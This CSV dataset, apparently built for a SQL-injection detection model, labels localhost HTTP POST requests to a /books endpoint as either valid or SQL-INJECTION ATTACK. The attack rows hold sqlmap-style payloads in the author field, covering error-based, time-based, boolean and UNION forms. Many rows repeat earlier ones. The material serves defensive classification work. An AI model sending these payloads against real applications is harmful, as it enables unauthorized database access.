,raw_sql,predict_val
0,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 260		{""name"":""Hackathon-Demo0"",""author"":""RameshAND ROW(4115,7844)>(SELECT COUNT(*),CONCAT(0x717a786271,(SELECT (ELT(4115=4115,1))),0x7176767871,FLOOR(RAND(0)*2))x FROM (SELECT 9757 UNION SELECT 8982 UNION SELECT 5308 UNION SELECT 5233)a GROUP BY x)"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
1,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 61		{""name"":""Hackathon-Demo1"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
2,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 72		{""name"":""Hackathon-Demo2"",""author"":""Ramesh AND SLEEP(5)"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
3,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 61		{""name"":""Hackathon-Demo3"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
4,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 73		{""name"":""Hackathon-Demo4"",""author"":""Ramesh AND SLEEP(5)#"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
5,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 61		{""name"":""Hackathon-Demo5"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
6,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 149		{""name"":""Hackathon-Demo6"",""author"":""Ramesh PROCEDURE ANALYSE(EXTRACTVALUE(3695,CONCAT(0x5c,(BENCHMARK(5000000,MD5(0x50477a4b))))),1)"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
7,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 61		{""name"":""Hackathon-Demo7"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
8,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 82		{""name"":""Hackathon-Demo8"",""author"":""Ramesh UNION ALL SELECT NULL#"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
9,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 61		{""name"":""Hackathon-Demo9"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
10,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 93		{""name"":""Hackathon-Demo10"",""author"":""Ramesh %""))) AND 1868=7345 AND (((""%""="""",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
11,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo11"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
12,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 92		{""name"":""Hackathon-Demo12"",""author"":""Ramesh%""))) AND 3428=3428 AND (((""%""="""",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
13,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo13"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
14,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 82		{""name"":""Hackathon-Demo14"",""author"":""Ramesh' AND 2353=8039-- HKuw"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
15,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo15"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
16,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 92		{""name"":""Hackathon-Demo16"",""author"":""Ramesh' AND 3428=3428 AND 'UXQG'='UXQG"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
17,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo17"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
18,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 97		{""name"":""Hackathon-Demo18"",""author"":""Ramesh' AND 3428=3428 AND 'XXPS' LIKE 'XXPS"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
19,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo19"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
20,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 82		{""name"":""Hackathon-Demo20"",""author"":""Ramesh' AND 3428=3428-- jSyW"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
21,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo21"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
22,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 97		{""name"":""Hackathon-Demo22"",""author"":""Ramesh' AND 4786=4963 AND 'IIVq' LIKE 'IIVq"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
23,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo23"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
24,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 92		{""name"":""Hackathon-Demo24"",""author"":""Ramesh' AND 5103=4169 AND 'CEYB'='CEYB"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
25,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo25"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
26,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 93		{""name"":""Hackathon-Demo26"",""author"":""Ramesh' IN BOOLEAN MODE) AND 3428=3428#"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
27,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo27"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
28,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 93		{""name"":""Hackathon-Demo28"",""author"":""Ramesh' IN BOOLEAN MODE) AND 4810=4637#"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
29,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo29"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
30,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 98		{""name"":""Hackathon-Demo30"",""author"":""Ramesh' WHERE 4925=4925 AND 1281=7105-- OCdK"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
31,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo31"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
32,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 98		{""name"":""Hackathon-Demo32"",""author"":""Ramesh' WHERE 5527=5527 AND 3428=3428-- QxBN"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
33,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo33"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
34,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 94		{""name"":""Hackathon-Demo34"",""author"":""Ramesh') AND 3428=3428 AND ('QGry'='QGry"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
35,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo35"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
36,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 99		{""name"":""Hackathon-Demo36"",""author"":""Ramesh') AND 3428=3428 AND ('aSyd' LIKE 'aSyd"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
37,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo37"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
38,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 83		{""name"":""Hackathon-Demo38"",""author"":""Ramesh') AND 3428=3428-- gvQa"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
39,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo39"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
40,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 99		{""name"":""Hackathon-Demo40"",""author"":""Ramesh') AND 6605=1377 AND ('JIdw' LIKE 'JIdw"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
41,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo41"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
42,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 129		{""name"":""Hackathon-Demo42"",""author"":""RameshSELECT CONCAT(0x717a786271,(SELECT (ELT(9500=9500,1))),0x7176767871))"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
43,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo43"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
44,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 149		{""name"":""Hackathon-Demo44"",""author"":""Ramesh(UPDATEXML(3615,CONCAT(0x2e,0x717a786271,(SELECT (ELT(3615=3615,1))),0x7176767871),5839))"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
45,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo45"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
46,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 103		{""name"":""Hackathon-Demo46"",""author"":""Ramesh-1011)) OR (1891=4226)*4226 AND ((9752=9752"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
47,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo47"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
48,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 388		{""name"":""Hackathon-Demo48"",""author"":""Ramesh-1012 UNION ALL SELECT 3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447#"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
49,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo49"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
50,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 87		{""name"":""Hackathon-Demo50"",""author"":""Ramesh-1012))) OR 7241=4523\u0016"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
51,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo51"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
52,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 93		{""name"":""Hackathon-Demo52"",""author"":""Ramesh1960 OR ELT(2187=4030,4030)# jqpa"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
53,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo53"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
54,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 110		{""name"":""Hackathon-Demo54"",""author"":""Ramesh-1961')) OR ELT(8504=1300,1300) AND (('ofRR'='ofRR"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
55,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo55"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
56,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 88		{""name"":""Hackathon-Demo56"",""author"":""Ramesh-1969%') OR 1943=1943-- dJSs"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
57,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo57"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
58,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 96		{""name"":""Hackathon-Demo58"",""author"":""Ramesh-1969%'))) OR 3191=4443 AND ((('%'='"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
59,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo59"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
60,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 87		{""name"":""Hackathon-Demo60"",""author"":""Ramesh-1976"") OR 7547=7547-- mTUA"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
61,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo61"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
62,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 80		{""name"":""Hackathon-Demo62"",""author"":""Ramesh-1983' OR 1598=4389#"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
63,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 260		{""name"":""Hackathon-Demo0"",""author"":""RameshAND ROW(4115,7844)>(SELECT COUNT(*),CONCAT(0x717a786271,(SELECT (ELT(4115=4115,1))),0x7176767871,FLOOR(RAND(0)*2))x FROM (SELECT 9757 UNION SELECT 8982 UNION SELECT 5308 UNION SELECT 5233)a GROUP BY x)"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
64,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 61		{""name"":""Hackathon-Demo1"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
65,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 72		{""name"":""Hackathon-Demo2"",""author"":""Ramesh AND SLEEP(5)"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
66,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 61		{""name"":""Hackathon-Demo3"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
67,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 73		{""name"":""Hackathon-Demo4"",""author"":""Ramesh AND SLEEP(5)#"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
68,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 61		{""name"":""Hackathon-Demo5"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
69,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 149		{""name"":""Hackathon-Demo6"",""author"":""Ramesh PROCEDURE ANALYSE(EXTRACTVALUE(3695,CONCAT(0x5c,(BENCHMARK(5000000,MD5(0x50477a4b))))),1)"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
70,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 61		{""name"":""Hackathon-Demo7"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
71,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 82		{""name"":""Hackathon-Demo8"",""author"":""Ramesh UNION ALL SELECT NULL#"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
72,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 61		{""name"":""Hackathon-Demo9"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
73,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 93		{""name"":""Hackathon-Demo10"",""author"":""Ramesh %""))) AND 1868=7345 AND (((""%""="""",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
74,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo11"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
75,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 92		{""name"":""Hackathon-Demo12"",""author"":""Ramesh%""))) AND 3428=3428 AND (((""%""="""",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
76,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo13"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
77,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 82		{""name"":""Hackathon-Demo14"",""author"":""Ramesh' AND 2353=8039-- HKuw"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
78,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo15"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
79,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 92		{""name"":""Hackathon-Demo16"",""author"":""Ramesh' AND 3428=3428 AND 'UXQG'='UXQG"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
80,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo17"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
81,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 97		{""name"":""Hackathon-Demo18"",""author"":""Ramesh' AND 3428=3428 AND 'XXPS' LIKE 'XXPS"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
82,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo19"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
83,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 82		{""name"":""Hackathon-Demo20"",""author"":""Ramesh' AND 3428=3428-- jSyW"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
84,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo21"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
85,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 97		{""name"":""Hackathon-Demo22"",""author"":""Ramesh' AND 4786=4963 AND 'IIVq' LIKE 'IIVq"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
86,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo23"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
87,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 92		{""name"":""Hackathon-Demo24"",""author"":""Ramesh' AND 5103=4169 AND 'CEYB'='CEYB"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
88,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo25"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
89,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 93		{""name"":""Hackathon-Demo26"",""author"":""Ramesh' IN BOOLEAN MODE) AND 3428=3428#"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
90,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo27"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
91,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 93		{""name"":""Hackathon-Demo28"",""author"":""Ramesh' IN BOOLEAN MODE) AND 4810=4637#"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
92,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo29"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
93,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 98		{""name"":""Hackathon-Demo30"",""author"":""Ramesh' WHERE 4925=4925 AND 1281=7105-- OCdK"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
94,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo31"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
95,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 98		{""name"":""Hackathon-Demo32"",""author"":""Ramesh' WHERE 5527=5527 AND 3428=3428-- QxBN"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
96,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo33"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
97,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 94		{""name"":""Hackathon-Demo34"",""author"":""Ramesh') AND 3428=3428 AND ('QGry'='QGry"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
98,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo35"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
99,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 99		{""name"":""Hackathon-Demo36"",""author"":""Ramesh') AND 3428=3428 AND ('aSyd' LIKE 'aSyd"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
100,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo37"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
101,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 83		{""name"":""Hackathon-Demo38"",""author"":""Ramesh') AND 3428=3428-- gvQa"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
102,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo39"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
103,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 99		{""name"":""Hackathon-Demo40"",""author"":""Ramesh') AND 6605=1377 AND ('JIdw' LIKE 'JIdw"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
104,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo41"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
105,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 129		{""name"":""Hackathon-Demo42"",""author"":""RameshSELECT CONCAT(0x717a786271,(SELECT (ELT(9500=9500,1))),0x7176767871))"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
